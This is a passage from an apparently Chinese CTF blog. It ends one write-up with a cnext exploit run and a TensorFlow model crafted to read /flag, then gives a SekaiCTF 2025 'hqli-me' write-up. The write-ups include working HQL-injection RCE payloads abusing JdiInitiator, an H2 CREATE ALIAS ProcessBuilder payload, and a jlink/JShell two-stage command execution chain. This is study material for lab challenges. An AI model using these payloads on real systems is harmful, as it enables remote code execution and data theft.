size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@dataclass  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    start: <span class="built_in">int</span>  </span><br><span class="line">    stop: <span class="built_in">int</span>  </span><br><span class="line">    permissions: <span class="built_in">str</span>  </span><br><span class="line">    path: <span class="built_in">str</span>  </span><br><span class="line">  </span><br><span class="line"><span class="meta">    @property  </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:  </span><br><span class="line">        <span class="keyword">return</span> self.stop - self.start  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">Exploit()</span><br></pre></td></tr></table></figure><p>由于权限不足, 不能直接读flag, 且不出网, 无写权限,</p><p>直接看一下suid, 把输出写到&#x2F;tmp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py &quot;https://eci-2zefy6ftjjeuuqjqwyee.cloudeci1.ichunqiu.com:80/&quot; &quot; find / -user root -perm -4000 -print 2&gt;/dev/null &gt;/tmp/a&quot;</span><br></pre></td></tr></table></figure><p>可以看见&#x2F;readflag有suid</p><p><img src="https://gagjcxhxrb.feishu.cn/space/api/box/stream/download/asynccode/?code=OTAwY2FjMDM1OGU1ZWU2YTIyNDBmNmM3MWM5MjczMDZfalkxUFgwSUNsdkphQlZCYTl0aXo0OVo2OEJ6SERCWWNfVG9rZW46Tk5HS2JBd3ZBb3JuVEt4TUpnRWNiaHFSbnFiXzE3NTc5MjcxOTc6MTc1NzkzMDc5N19WNA"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit33.py &quot;https://eci-2zefy6ftjjeuuqjqwyee.cloudeci1.ichunqiu.com:80/&quot; &quot;/readflag &gt;/tmp/a&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gagjcxhxrb.feishu.cn/space/api/box/stream/download/asynccode/?code=MjRhOTMxMjc1ZDg3NDZjM2QyNjEwYWY5NWE0MWEzMWRfYm51Z1paeG9zMXF6SFFrbVoyNWNDb3VoTGVOR0JDQ1RfVG9rZW46U1pWY2JZajF6b3FVTXh4clZJRmNaQUZhbnZlXzE3NTc5MjcxOTc6MTc1NzkzMDc5N19WNA"></p><h2 id="Mini-modelscope"><a href="#Mini-modelscope" class="headerlink" title="Mini-modelscope"></a>Mini-modelscope</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MaliciousModule</span>(tf.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment"># __init__ 不执行任何文件 I/O</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @tf.function(<span class="params">input_signature=[tf.TensorSpec(<span class="params">shape=[<span class="number">1</span>,<span class="number">1</span>], dtype=tf.float32</span>)]</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">serve</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># 使用 TensorFlow 原生文件读取</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = tf.io.read_file(<span class="string">&quot;/flag&quot;</span>)  <span class="comment"># 返回 tf.string</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag = tf.constant(<span class="string">&quot;FLAG_NOT_FOUND&quot;</span>)</span><br><span class="line">        <span class="comment"># 返回 shape=(1,) 的 tensor</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;prediction&quot;</span>: tf.reshape(flag, [<span class="number">1</span>])&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 保存模型 ====</span></span><br><span class="line">model = MaliciousModule()</span><br><span class="line">tf.saved_model.save(model, <span class="string">&quot;malicious_model&quot;</span>, signatures=&#123;<span class="string">&#x27;serve&#x27;</span>: model.serve&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 打包为 ZIP ====</span></span><br><span class="line">shutil.make_archive(<span class="string">&quot;model&quot;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&quot;malicious_model&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated model.zip&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==== 上传到靶机 ====</span></span><br><span class="line">url = <span class="string">&quot;https://eci-2ze3h3ldcbzfy3zyrndw.cloudeci1.ichunqiu.com:5000/upload&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;model.zip&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    files = &#123;<span class="string">&#x27;model_file&#x27;</span>: (<span class="string">&quot;model.zip&quot;</span>, f, <span class="string">&#x27;application/zip&#x27;</span>)&#125;</span><br><span class="line">    r = requests.post(url, files=files, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Upload response:&quot;</span>, r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sekaictf 2025 hqli-me</title>
      <link href="/2025/09/15/sekaictf-2025-hqli-me/"/>
      <url>/2025/09/15/sekaictf-2025-hqli-me/</url>
      
        <content type="html"><![CDATA[<h2 id="hqli-me"><a href="#hqli-me" class="headerlink" title="hqli-me"></a>hqli-me</h2><p>参考:<br><a href="https://www.valgrindc.tf/posts/hqli-me/">https://www.valgrindc.tf/posts/hqli-me/</a></p><p>题目总体有两部分</p><ol><li><code>authn_service</code> 使用h2数据库</li><li><code>order_service</code> 使用mysql数据库<br>而远程只暴露出<code>order_service</code>, 但flag存在于<code>authn_service</code></li></ol><h3 id="order-service"><a href="#order-service" class="headerlink" title="order_service"></a>order_service</h3><p>先看order_service, 在order_service中明显存在sql注入<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250904155924.png" alt="image.png"><br>去看<code>Util.validateFields(fields)</code>的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">validateFields</span><span class="params">(String fields)</span> &#123;  </span><br><span class="line">    <span class="type">var</span> <span class="variable">tokens</span> <span class="operator">=</span> fields.split(<span class="string">&quot;,&quot;</span>);  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tokens.length; i++) &#123;  </span><br><span class="line">        <span class="type">var</span> <span class="variable">token</span> <span class="operator">=</span> tokens[i].trim();  </span><br><span class="line">        <span class="comment">// Check if it contains non-alphanumeric character  </span></span><br><span class="line">        <span class="keyword">if</span> (Pattern.matches(<span class="string">&quot;\\W&quot;</span>, token)) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3></blockquote><ul><li><p><code>String.split(&quot;,&quot;)</code>：把输入的字符串分成若干字段，比如 <code>&quot;id,name,age&quot;</code> → <code>[&quot;id&quot;, &quot;name&quot;, &quot;age&quot;]</code>。</p></li><li><p><code>Pattern.matches(&quot;\\W&quot;, token)</code>：检查 <strong>整个 token 是否完全由单个“非单词字符”构成</strong>。</p><ul><li><p>在 Java 正则里：</p><ul><li><p><code>\w</code> &#x3D; <code>[A-Za-z0-9_]</code>（字母、数字、下划线）</p></li><li><p><code>\W</code> &#x3D; <code>[^A-Za-z0-9_]</code>（非字母数字下划线）</p></li></ul></li><li><p>但是 ⚠️ <code>Pattern.matches</code> 要求 <strong>整个字符串都匹配</strong>，所以 <code>&quot;abc$&quot;</code> 不会返回 true，只有 <code>&quot;!&quot;</code> 这样的才会返回 true。</p></li></ul></li></ul><p>因此这里相当于是没有防护, </p><p>再看<code>order_service</code>如何操作<code>authn_service</code>, 一共有两处</p><ol><li>login, 对<code>/login</code>路由传入 可控username和md5(password)</li><li>getSession, 对<code>/sessionInfo</code>路由传入可控sessionId, 但sessionId进行了验证, 满足<code>if (!sessionId.matches(&quot;^[0-9a-fA-F]+$&quot;))</code>时抛错</li></ol><h3 id="authn-service"><a href="#authn-service" class="headerlink" title="authn_service"></a>authn_service</h3><p>再看authn_service<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250904173140.png" alt="image.png"></p><p>也是明显的两处注入</p><h3 id="HQL-RCE"><a href="#HQL-RCE" class="headerlink" title="HQL RCE"></a>HQL RCE</h3><p>这几处都是使用hibernate进行的orm, 因此可以造成<code>HQL</code>注入, 可以看见它的sql语句与普通的mysql确实有些差异, 他是对java对象的操作<br>参考:<br>[[HQL注入]]</p><p>HQL 的一个有趣的点是它允许我们在查询中使用 <code>new</code> 关键字调用 Java 类的构造函数。对于大多数类，构造函数对类字段进行简单的赋值，因此它们根本没有用处。一个主要的例外是 <a href="https://github.com/openjdk/jdk21/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/jdk.jshell/share/classes/jdk/jshell/execution/JdiInitiator.java">JdiInitiator</a>)。<br>文档<br><a href="https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E%5C(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map%5C)">https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E%5C(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map%5C)</a></p><p>关于这个类的背景, 其与JShell有关:<br>JShell 本身并不会在<strong>当前 JVM</strong>直接执行你写的代码，它会：</p><ol><li><p><strong>启动一个新的“执行 JVM”</strong>（Execution VM），专门用来运行你输入的代码。</p><ul><li>这个 JVM 是用 JDI 启动的（相当于 IDE 调试器 attach 一个 JVM）。</li></ul></li><li><p><strong>把你的代码片段（snippet）编译成 class</strong>，通过 JDI 发送到那个 JVM 里。</p></li><li><p><strong>在执行 JVM 里运行它</strong>，然后通过 JDI 把结果返回给 JShell。<br>这个过程中，<code>JdiInitiator</code> 就是 <strong>负责第 1 步“启动并连接执行 JVM”</strong> 的类。</p></li></ol><p>再比如:<br>当你在命令行运行 <code>jshell</code>，然后输入 <code>System.out.println(&quot;hi&quot;)</code> 时：</p><ul><li><p><code>JdiInitiator</code> 会启动一个子 JVM；</p></li><li><p>通过 JDI 把你的代码片段（class 文件&#x2F;字节码）送进去；</p></li><li><p>然后拿回运行结果。</p></li></ul><p>在启动JVM时, 会指定自定义的jvm启动参数, 对应构造器参数 <a href="https://docs.oracle.com/en/java/javase/21/docs/api/jdk.jshell/jdk/jshell/execution/JdiInitiator.html#%3Cinit%3E(int,java.util.List,java.lang.String,boolean,java.lang.String,int,java.util.Map)"><code>customConnectorArgs</code></a><br>按照文档, 该参数是<code>custom arguments passed to the connector</code>, 这回传给connector</p><p>根据构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;this-escape&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JdiInitiator</span><span class="params">(<span class="type">int</span> port, List&lt;String&gt; remoteVMOptions, String remoteAgent,</span></span><br><span class="line"><span class="params">            <span class="type">boolean</span> isLaunch, String host, <span class="type">int</span> timeout,</span></span><br><span class="line"><span class="params">            Map&lt;String, String&gt; customConnectorArgs)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.remoteAgent = remoteAgent;</span><br><span class="line">        <span class="built_in">this</span>.connectTimeout = (<span class="type">int</span>) (timeout * CONNECT_TIMEOUT_FACTOR);</span><br><span class="line">        <span class="type">String</span> <span class="variable">connectorName</span></span><br><span class="line">                <span class="operator">=</span> isLaunch</span><br><span class="line">                        ? <span class="string">&quot;com.sun.jdi.CommandLineLaunch&quot;</span></span><br><span class="line">                        : <span class="string">&quot;com.sun.jdi.SocketListen&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.connector = findConnector(connectorName);</span><br><span class="line">        <span class="keyword">if</span> (connector == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No connector named: &quot;</span> + connectorName);</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;String, String&gt; argumentName2Value</span><br><span class="line">                = isLaunch</span><br><span class="line">                        ? launchArgs(port, String.join(<span class="string">&quot; &quot;</span>, remoteVMOptions))</span><br><span class="line">                        : <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (!isLaunch) &#123;</span><br><span class="line">            argumentName2Value.put(<span class="string">&quot;timeout&quot;</span>, <span class="string">&quot;&quot;</span>+timeout);</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span> &amp;&amp; !isLaunch) &#123;</span><br><span class="line">                argumentName2Value.put(<span class="string">&quot;localAddress&quot;</span>, host);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        customConnectorArgs.entrySet()</span><br><span class="line">                           .stream()</span><br><span class="line">                           .filter(e -&gt; !<span class="string">&quot;vmexec&quot;</span>.equals(e.getKey()))</span><br><span class="line">                           .forEach(e -&gt; argumentName2Value.put(e.getKey(), e.getValue()));</span><br><span class="line">        <span class="built_in">this</span>.connectorArgs = mergeConnectorArgs(connector, argumentName2Value);</span><br><span class="line">        <span class="built_in">this</span>.vm = isLaunch</span><br><span class="line">                ? launchTarget()</span><br><span class="line">                : listenTarget(port, remoteVMOptions);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里connector对应两种(启动模式和监听模式), 我们关注的是<code>com.sun.jdi.CommandLineLaunch</code>这个命令行启动, 它的默认实现是<a href="https://github.com/openjdk/jdk21/blob/890adb6410dab4606a4f26a942aed02fb2f55387/src/jdk.jdi/share/classes/com/sun/tools/jdi/SunCommandLineLauncher.java"><code>SunCommandLineLauncher</code></a><br>阅读<code>JdiInitiator</code>的构造器源码, 最终是可以调用到<code>SunCommandLineLauncher</code>的<code>launch</code>方法, </p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250905214909.png" alt="image.png"></p><p>查看这个command的拼接来源</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">home</span> <span class="operator">=</span> argument(ARG_HOME, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">options</span> <span class="operator">=</span> argument(ARG_OPTIONS, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">mainClassAndArgs</span> <span class="operator">=</span> argument(ARG_MAIN, arguments).value();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">wait</span> <span class="operator">=</span> ((BooleanArgumentImpl)argument(ARG_INIT_SUSPEND,</span><br><span class="line">                                                  arguments)).booleanValue();</span><br><span class="line">        <span class="type">String</span> <span class="variable">quote</span> <span class="operator">=</span> argument(ARG_QUOTE, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exe</span> <span class="operator">=</span> argument(ARG_VM_EXEC, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">includeVThreads</span> <span class="operator">=</span> argument(ARG_VM_INCLUDE_VTHREADS, arguments).value();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exePath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>发现<code>exePath</code>是arguments参数传过来, 可控的!<br>这样我们就可以在其启动命令中进行命令注入了</p><p>写个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.jshell.execution.JdiInitiator;  </span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        map.put(<span class="string">&quot;home&quot;</span>, <span class="string">&quot;calc\&quot; \&quot;&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JdiInitiator</span> <span class="variable">jdiInitiator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdiInitiator</span>(<span class="number">30000</span>,  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(),  </span><br><span class="line">                <span class="string">&quot;&quot;</span>,  </span><br><span class="line">                <span class="literal">true</span>,  </span><br><span class="line">                <span class="string">&quot;127.0.0.1&quot;</span>,  </span><br><span class="line">                <span class="number">10000000</span>,  </span><br><span class="line">                map);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250905223355.png" alt="image.png"></p><p>hql使用</p><ol><li>new map(“value1” as key1, “value2” as key2)创建map</li><li>new list(“value1”, “value2”) 创建list</li></ol><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessionId=3916dbbe17d08b5802cdcb35824e316&amp;fields=new jdk.jshell.execution.JdiInitiator(5, new list(&quot;&quot;), new java.lang.String(&quot;asdf&quot;), true, null, 8000, new map(&quot;^&quot; as quote,&quot;^bash^-c^^id&gt;/tmp/win^^&quot; as home)) UNION select new jdk.jshell.execution.JdiInitiator(0, new list(&quot;&quot;), new java.lang.String(&quot;jdk.jshell.execution.RemoteExecutionControl&quot;), true, null, 8000, new map(&quot;a&quot; as a, &quot;b&quot; as b))</span><br></pre></td></tr></table></figure><p>这可以使得命令注入的结果输出到tmp目录<br>至于为什么需要后面的<code>UNION select</code>, 作者题解中解释说是为了确保hibernate能够收到返回值,具有相同的列数,  当我去掉UNION查询时, 并没有看见任何报错信息, 但注入的命令也没有被执行<br>gpt给出的解释如下:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250907135313.png" alt="image.png"></p><p>猜测大概是延迟实例化的原因</p><p>现在已经拿下了<code>order_service</code>, 但flag存在于<code>authn_service</code>, 思路是通过ssrf来打<code>authn_service</code>的 h2</p><p>在本地把<code>authn_service</code>的8000端口映射出来用作测试</p><p>根据<a href="https://github.com/project-sekai-ctf/sekaictf-2025/blob/main/web/hqli-me/solution/e.py">官方WP</a> , payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=aaaa&amp;password=&quot; and function(&#x27;CSVWRITE&#x27;,&#x27;/tmp/kek&#x27;,&#x27;select 1;CREATE ALIAS SHELLEXEC AS &#x27;&#x27;void leak(String sessId, String cmd) throws java.lang.Exception &#123;sekai.HibernateUtil.addSession(new sekai.Session(sekai.HibernateUtil.addUser(new sekai.User(new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]&#123;39, 124, 124, 34&#125;)), cmd)), sessId));&#125;//&#x27;&#x27;; CALL SHELLEXEC(&#x27;&#x27;a&#x27;&#x27;, &#x27;&#x27;/flag&#x27;&#x27;)&#x27;,&#x27;charset=UTF-8&#x27;)=&quot;</span><br></pre></td></tr></table></figure><p>在h2中使用<code>function()</code>去调用CSVWRITE, 但目的不在于CSVWRITE, 而是可以执行后面的sql语句, 利用h2可以执行java代码的特性, 执行以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void leak(String sessId, String cmd) throws java.lang.Exception &#123;  </span><br><span class="line">    sekai.HibernateUtil.addSession(  </span><br><span class="line">            new sekai.Session(  </span><br><span class="line">                    sekai.HibernateUtil.addUser(  </span><br><span class="line">                            new sekai.User(  </span><br><span class="line">                                    new java.lang.String(  </span><br><span class="line">                                            new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]&#123;39, 124, 124, 34&#125;)), cmd)), sessId));  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后<code>CALL SHELLEXEC(&#39;&#39;a&#39;&#39;, &#39;&#39;/flag&#39;&#39;)</code>, 创建了一个sessionId为<code>a</code>, username为 <code>&lt;/flag内容&gt; &#39;|| &quot;</code><br>这里的<code>&#39;|| &quot;</code>是用来闭合hql语句的</p><p>之后当去 order_serive查询<code>sessionId=a&amp;fields=1||&#39;</code><br>首先代码中会根据sessionId查出authnUser, 也就是<code>SEKAI&#123;test_flag&#125;\n&#39;||&quot;</code><br>之后</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select %s from Order o where o.username=\&quot;%s\&quot;&quot;</span>.formatted(fields, authnUser);</span><br></pre></td></tr></table></figure><p>就会构造出</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span><span class="operator">||</span><span class="string">&#x27; from Order o where o.username=&quot; SEKAI&#123;test_flag&#125;\n&#x27;</span><span class="operator">||</span>&quot;&quot;</span><br></pre></td></tr></table></figure><p>这样就把flag回显带出来了</p><p>有了攻击<code>authn_service</code>的payload, 我们只需要在<code>order_service</code>命令注入, 使用wget 或者curl将payload提交到<code>authn_service</code>, 之后就能访问<code>order_service</code>获得flag</p><p>关于前面的命令注入, 题目给出了另一种方法, 这里我以执行id命令给出payload<br>首先还是在<code>orders</code>路由<br>payload1:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sessionId=a0b77d2f648dd30ee9a77cd385fcd164&amp;fields=new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/tools/jlink/internal/Main --save-opts /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \&quot;\n</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(new String(new byte[]&#123;105,100&#125;));</span><br><span class="line"></span><br><span class="line">\&quot; --save-opts /tmp/lol&quot; as main, &quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads)) union select new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/tools/jlink/internal/Main --save-opts /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \&quot;\n</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(new String(new byte[]&#123;105,100&#125;));</span><br><span class="line"></span><br><span class="line">\&quot; --save-opts /tmp/lol&quot; as main, &quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads))</span><br></pre></td></tr></table></figure><p>首先还是使用JdiInitiator, 在其参数map中设置main为一个jlink命令, 这里本意并不是要使用jlink, 关键在于<code>--save-opts /tmp/lol</code>, 把这次的jlink参数保存在了<code>/tmp/lol</code>, 我们可以看见<code>/tmp/lol</code>是这样的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250910123908.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Tue Sep 09 14:18:16 UTC 2025</span><br><span class="line">--output /tmp/ab --add-modules java.base -p </span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().exec(new String(new byte[]&#123;105,100&#125;));</span><br><span class="line"> --save-opts /tmp/lol </span><br></pre></td></tr></table></figure><p>之后payload2</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessionId=a0b77d2f648dd30ee9a77cd385fcd164&amp;fields=new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/internal/jshell/tool/JShellToolProvider /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads)) union select new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/internal/jshell/tool/JShellToolProvider /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads))</span><br></pre></td></tr></table></figure><p>这里使用JShellToolProvider而不是把&#x2F;tmp&#x2F;lol的内容推到jshell中当作java代码执行, 这个过程&#x2F;tmp&#x2F;lol文件中的java代码就被成功执行了</p><p>官方exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 